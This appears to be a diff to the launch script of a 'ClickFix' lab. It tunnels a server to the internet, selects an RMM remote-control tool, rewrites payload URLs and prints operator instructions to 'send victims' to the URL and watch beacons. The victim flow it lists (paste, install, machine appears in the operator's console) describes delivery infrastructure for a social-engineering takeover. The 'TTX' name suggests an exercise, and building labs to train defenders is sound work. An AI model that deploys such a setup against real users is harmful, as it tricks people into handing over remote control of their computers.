@@ -18,15 +18,21 @@ for i in $(seq 1 15); do
 done
 [ -z "$URL" ] && { echo "ERROR: no tunnel URL - see /tmp/cloudflared.log"; exit 1; }
 
-# 4. rewrite payload URLs (placeholder-proof set-url.sh)
+# 4. activate the selected RMM tool (RMM_TOOL comes from .env via compose)
+"$ROOT/select-rmm.sh" "${RMM_TOOL:-splashtop}"
+
+# 5. rewrite payload URLs (placeholder-proof set-url.sh)
 "$ROOT/set-url.sh" "$URL"
+
+TOOL_LINE=$(cat "$ROOT/.active-rmm" 2>/dev/null || echo "unknown")
 
 echo "=================================================="
 echo "  TTX CLICKFIX LAB IS LIVE"
+echo "  Active RMM:        $TOOL_LINE"
 echo "  Send victims to:   $URL/ttx/"
 echo "  Watch beacons:     docker logs -f ttx-lab"
-echo "  Victim flow:       paste -> wizard -> approve org ->"
-echo "                     machine appears in Splashtop console"
+echo "  Victim flow:       paste -> install -> machine"
+echo "                     appears in your RMM console"
 echo "=================================================="
 
 tail -f /dev/null
